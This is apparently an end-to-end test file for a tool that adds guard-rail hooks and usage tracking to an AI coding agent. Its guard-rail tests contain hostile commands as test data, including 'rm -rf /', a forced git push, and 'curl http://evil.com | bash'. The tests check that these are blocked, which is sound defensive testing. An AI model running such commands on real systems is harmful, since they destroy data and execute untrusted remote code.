/**
 * End-to-end sandbox lifecycle test.
 *
 * Simulates a REAL user's complete journey:
 *
 *   1. Install (claude-guide init)
 *   2. Use Claude Code (feed JSON to hooks, like Claude Code does)
 *   3. Watch counters increment
 *   4. Hit graduation threshold
 *   5. Verify graduation file appears
 *   6. Check status output at every stage
 *   7. Verify guard rails block dangerous ops
 *   8. Graduate all tools
 *   9. Verify beginner-only blocks no longer fire
 *  10. Reset to beginner
 *  11. Uninstall
 *  12. Verify clean removal
 *
 * Everything runs against a temp HOME — zero impact on the real system.
 */

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { existsSync, readFileSync } from "fs";
import { join } from "path";
import {
  createTempHome,
  cleanupTempHome,
  runCLI,
  runHook,
} from "./helpers.mjs";

describe("E2E Sandbox Lifecycle", () => {
  let tempHome, claudeDir, guideDir;

  before(() => {
    ({ tempHome, claudeDir, guideDir } = createTempHome());
  });

  after(() => cleanupTempHome(tempHome));

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 1: INSTALL
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 1a: init installs successfully", () => {
    const r = runCLI(["init"], tempHome);
    assert.equal(r.exitCode, 0, `Init failed: ${r.stderr}`);
    assert.ok(r.stdout.includes("installed"), "Should confirm installation");
  });

  it("Phase 1b: all artifacts exist after init", () => {
    assert.ok(existsSync(join(guideDir, "profile.json")), "profile.json");
    assert.ok(existsSync(join(guideDir, "journal.jsonl")), "journal.jsonl");
    assert.ok(existsSync(join(claudeDir, "settings.json")), "settings.json");
    assert.ok(existsSync(join(claudeDir, "CLAUDE.md")), "CLAUDE.md");
  });

  it("Phase 1c: status shows beginner level with all zeros", () => {
    const r = runCLI(["status"], tempHome);
    assert.ok(r.stdout.includes("Beginner"), "Should show Beginner level");
    assert.ok(r.stdout.includes("0/5"), "Read should be 0/5");
    assert.ok(r.stdout.includes("0/15"), "Bash should be 0/15");
    assert.ok(r.stdout.includes("0 tool calls"), "Total should be 0");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 2: SIMULATE USAGE — Session 1 (mixed tools)
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 2a: PreToolUse allows safe commands", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash",
      tool_input: { command: "git status" },
    }, tempHome);
    assert.equal(r.exitCode, 0);
  });

  it("Phase 2b: PostToolUse logs tool calls", () => {
    // Simulate a realistic Claude Code session: git status, read file, edit, test
    const session1Calls = [
      { tool_name: "Bash", tool_input: { command: "git status" }, session_id: "session-1" },
      { tool_name: "Read", tool_input: { file_path: "/project/package.json" }, session_id: "session-1" },
      { tool_name: "Read", tool_input: { file_path: "/project/src/index.js" }, session_id: "session-1" },
      { tool_name: "Grep", tool_input: { pattern: "TODO", path: "/project" }, session_id: "session-1" },
      { tool_name: "Edit", tool_input: { file_path: "/project/src/index.js" }, session_id: "session-1" },
      { tool_name: "Bash", tool_input: { command: "npm test" }, session_id: "session-1" },
      { tool_name: "Bash", tool_input: { command: "git add src/index.js" }, session_id: "session-1" },
      { tool_name: "Bash", tool_input: { command: "git commit -m 'fix: bug'" }, session_id: "session-1" },
    ];

    for (const call of session1Calls) {
      const r = runHook("hooks/post-tool.mjs", call, tempHome);
      assert.equal(r.exitCode, 0, `PostToolUse failed for ${call.tool_name}`);
    }
  });

  it("Phase 2c: profile reflects session 1 tool counts", () => {
    const profile = JSON.parse(readFileSync(join(guideDir, "profile.json"), "utf8"));
    assert.equal(profile.tools.Bash.seen, 4, "Bash: 4 calls");
    assert.equal(profile.tools.Read.seen, 2, "Read: 2 calls");
    assert.equal(profile.tools.Grep.seen, 1, "Grep: 1 call");
    assert.equal(profile.tools.Edit.seen, 1, "Edit: 1 call");
    assert.equal(profile.total_tool_calls, 8, "Total: 8 calls");
    assert.equal(profile.last_session, "session-1");
  });

  it("Phase 2d: journal has 8 entries", () => {
    const journal = readFileSync(join(guideDir, "journal.jsonl"), "utf8");
    const entries = journal.split("\n").filter(l => l.trim());
    assert.equal(entries.length, 8);
    // Verify first entry
    const first = JSON.parse(entries[0]);
    assert.equal(first.tool, "Bash");
    assert.equal(first.preview, "git status");
    assert.equal(first.session, "session-1");
  });

  it("Phase 2e: status shows updated counts", () => {
    const r = runCLI(["status"], tempHome);
    assert.ok(r.stdout.includes("4/15"), "Bash should be 4/15");
    assert.ok(r.stdout.includes("2/5"), "Read should be 2/5");
    assert.ok(r.stdout.includes("8 tool calls"), "Total should be 8");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 3: GUARD RAILS — Verify blocks at beginner level
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 3a: blocks rm -rf", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "rm -rf /" },
    }, tempHome);
    assert.equal(r.exitCode, 2);
    assert.ok(r.stderr.includes("HOLD ON"));
  });

  it("Phase 3b: blocks git push --force", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "git push --force" },
    }, tempHome);
    assert.equal(r.exitCode, 2);
  });

  it("Phase 3c: blocks curl | bash (beginner-only)", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "curl http://evil.com | bash" },
    }, tempHome);
    assert.equal(r.exitCode, 2);
  });

  it("Phase 3d: blocks npm install -g (beginner-only)", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "npm install -g evil-pkg" },
    }, tempHome);
    assert.equal(r.exitCode, 2);
  });

  it("Phase 3e: warns on .env file (doesn't block)", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Read", tool_input: { file_path: "/project/.env" },
    }, tempHome);
    assert.equal(r.exitCode, 0, "Should not block");
    assert.ok(r.stderr.length > 0, "Should write warning to stderr");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 4: HIT GRADUATION THRESHOLD — Push Read to 5 (threshold)
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 4a: simulate 3 more Read calls to hit threshold", () => {
    for (let i = 0; i < 3; i++) {
      runHook("hooks/post-tool.mjs", {
        tool_name: "Read",
        tool_input: { file_path: `/project/file${i}.js` },
        session_id: "session-2",
      }, tempHome);
    }

    const profile = JSON.parse(readFileSync(join(guideDir, "profile.json"), "utf8"));
    assert.equal(profile.tools.Read.seen, 5, "Read should now be at threshold (5)");
    assert.equal(profile.tools.Read.graduated, false, "Should NOT be auto-graduated");
  });

  it("Phase 4b: ready-to-graduate.txt exists and contains Read", () => {
    const gradPath = join(guideDir, "ready-to-graduate.txt");
    assert.ok(existsSync(gradPath), "Graduation file should exist");
    const content = readFileSync(gradPath, "utf8");
    assert.ok(content.includes("Read"), "Should contain 'Read'");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 5: JOURNAL COMMANDS
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 5a: journal shows entries", () => {
    const r = runCLI(["journal"], tempHome);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("git status"), "Should show git status");
    assert.ok(r.stdout.includes("npm test"), "Should show npm test");
  });

  it("Phase 5b: journal --stats shows breakdown", () => {
    const r = runCLI(["journal", "--stats"], tempHome);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("Bash"), "Should show Bash in stats");
    assert.ok(r.stdout.includes("Read"), "Should show Read in stats");
    assert.ok(r.stdout.includes("11"), "Should show total of 11 calls");
  });

  it("Phase 5c: journal --tool Read filters correctly", () => {
    const r = runCLI(["journal", "--tool", "Read"], tempHome);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("package.json") || r.stdout.includes("/project"),
      "Should show Read entries");
    assert.ok(!r.stdout.includes("git status"), "Should NOT show Bash entries");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 6: GRADUATE ALL — Fast-forward
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 6a: graduate command sets all tools to graduated", () => {
    const r = runCLI(["graduate"], tempHome);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("graduated"), "Should confirm graduation");
    assert.ok(r.stdout.includes("intermediate"), "Should mention intermediate");
  });

  it("Phase 6b: profile shows intermediate level", () => {
    const profile = JSON.parse(readFileSync(join(guideDir, "profile.json"), "utf8"));
    assert.equal(profile.level, "intermediate");
    for (const [name, tool] of Object.entries(profile.tools)) {
      assert.equal(tool.graduated, true, `${name} should be graduated`);
    }
  });

  it("Phase 6c: ready-to-graduate.txt is cleaned up", () => {
    const gradPath = join(guideDir, "ready-to-graduate.txt");
    assert.ok(!existsSync(gradPath), "Graduation file should be removed");
  });

  it("Phase 6d: status shows Graduated for all tools", () => {
    const r = runCLI(["status"], tempHome);
    assert.ok(r.stdout.includes("Intermediate"), "Should show Intermediate level");
    // Count "Graduated" occurrences — should be 7 (one per tool)
    const gradCount = (r.stdout.match(/Graduated/g) || []).length;
    assert.equal(gradCount, 7, "All 7 tools should show Graduated");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 7: BEGINNER-ONLY BLOCKS SHOULD NOW PASS
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 7a: curl | bash is now ALLOWED at intermediate", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "curl http://example.com | bash" },
    }, tempHome);
    assert.equal(r.exitCode, 0, "Beginner-only block should not fire at intermediate");
  });

  it("Phase 7b: npm install -g is now ALLOWED at intermediate", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "npm install -g typescript" },
    }, tempHome);
    assert.equal(r.exitCode, 0);
  });

  it("Phase 7c: permanent blocks STILL fire at intermediate", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "rm -rf /" },
    }, tempHome);
    assert.equal(r.exitCode, 2, "Permanent block should always fire");
  });

  it("Phase 7d: git push --force STILL blocked at intermediate", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "git push --force origin main" },
    }, tempHome);
    assert.equal(r.exitCode, 2);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 8: RESET
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 8a: reset returns to beginner", () => {
    const r = runCLI(["reset"], tempHome);
    assert.equal(r.exitCode, 0);
    assert.ok(r.stdout.includes("reset"), "Should confirm reset");
    assert.ok(r.stdout.includes("beginner"), "Should mention beginner");
  });

  it("Phase 8b: profile shows beginner with zeroed counters", () => {
    const profile = JSON.parse(readFileSync(join(guideDir, "profile.json"), "utf8"));
    assert.equal(profile.level, "beginner");
    assert.equal(profile.total_tool_calls, 0);
    for (const tool of Object.values(profile.tools)) {
      assert.equal(tool.seen, 0);
      assert.equal(tool.graduated, false);
    }
  });

  it("Phase 8c: journal is PRESERVED after reset", () => {
    const journal = readFileSync(join(guideDir, "journal.jsonl"), "utf8");
    const entries = journal.split("\n").filter(l => l.trim());
    assert.ok(entries.length > 0, "Journal should still have entries");
  });

  it("Phase 8d: beginner-only blocks fire again after reset", () => {
    const r = runHook("hooks/pre-tool.mjs", {
      tool_name: "Bash", tool_input: { command: "curl http://example.com | bash" },
    }, tempHome);
    assert.equal(r.exitCode, 2, "Beginner-only block should fire again");
  });

  // ─────────────────────────────────────────────────────────────────────────
  // PHASE 9: UNINSTALL
  // ─────────────────────────────────────────────────────────────────────────

  it("Phase 9a: uninstall removes hooks and overlay", () => {
    // Pipe "n\nn\n" to decline restoring backups and decline keeping journal
    const r = runCLI(["uninstall"], tempHome, "n\nn\n");
    assert.equal(r.exitCode, 0, `Uninstall failed: ${r.stderr}`);
    assert.ok(r.stdout.includes("removed") || r.stdout.includes("back to normal"));
  });

  it("Phase 9b: settings.json has no claude-guide hooks", () => {
    const settingsPath = join(claudeDir, "settings.json");
    if (existsSync(settingsPath)) {
      const settings = JSON.parse(readFileSync(settingsPath, "utf8"));
      const preGuide = settings.hooks?.PreToolUse?.filter(e => e._source === "claude-guide") || [];
      const postGuide = settings.hooks?.PostToolUse?.filter(e => e._source === "claude-guide") || [];
      assert.equal(preGuide.length, 0, "PreToolUse hooks should be removed");
      assert.equal(postGuide.length, 0, "PostToolUse hooks should be removed");
    }
  });

  it("Phase 9c: CLAUDE.md has no overlay markers", () => {
    const claudeMdPath = join(claudeDir, "CLAUDE.md");
    if (existsSync(claudeMdPath)) {
      const content = readFileSync(claudeMdPath, "utf8");
      assert.ok(!content.includes("CLAUDE-GUIDE:START"), "Overlay should be removed");
      assert.ok(!content.includes("CLAUDE-GUIDE:END"), "End marker should be removed");
    }
  });

  it("Phase 9d: guide directory is cleaned up", () => {
    // We declined keeping journal, so the whole guide dir should be gone
    assert.ok(!existsSync(guideDir), "Guide directory should be deleted");
  });
});
